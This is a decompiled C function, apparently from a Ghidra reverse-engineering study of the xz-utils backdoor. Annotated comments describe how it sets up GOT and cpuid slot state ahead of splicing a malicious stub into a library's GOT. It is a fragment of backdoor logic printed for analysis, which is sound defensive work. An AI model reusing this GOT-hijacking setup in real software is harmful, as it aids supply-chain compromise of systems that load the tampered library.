// /home/kali/xzre-ghidra/xzregh/104030_init_elf_entry_ctx.c
// Function: init_elf_entry_ctx @ 0x104030
// Calling convention: __stdcall
// Prototype: void __stdcall init_elf_entry_ctx(elf_entry_ctx_t * ctx)


/*
 * AutoDoc: Primes an `elf_entry_ctx_t` before the IFUNC resolvers run. It latches the relocation-safe cpuid anchor (`_Lrc_read_destroy`), copies the resolver's saved return address out of `ctx->resolver_frame[3]` as the cpuid GOT slot, replays `update_got_offset`/`update_cpuid_got_index`, and clears `tls_got_entry` so the later GOT patch re-resolves the TLS entry before grafting in the malicious cpuid stub.
 */

#include "xzre_types.h"

void init_elf_entry_ctx(elf_entry_ctx_t *ctx)

{
  // AutoDoc: Record the relocation-safe anchor symbol so GOT math has a stable base pointer.
  ctx->cpuid_random_symbol_addr = &_Lrc_read_destroy;
  // AutoDoc: Lift the resolver's saved return address (slot 3) as the GOT slot that will be patched.
  (ctx->got_ctx).cpuid_got_slot = (void *)ctx->resolver_frame[3];
  // AutoDoc: Recompute the GOT base offset before the hook splices anything into the table.
  update_got_offset(ctx);
  // AutoDoc: Refresh the cpuid GOT index while the resolver's frame is still intact.
  update_cpuid_got_index(ctx);
  // AutoDoc: Clear the cached TLS entry so the impending hook forces a new `__tls_get_addr` resolution.
  (ctx->got_ctx).tls_got_entry = (void *)0x0;
  return;
}

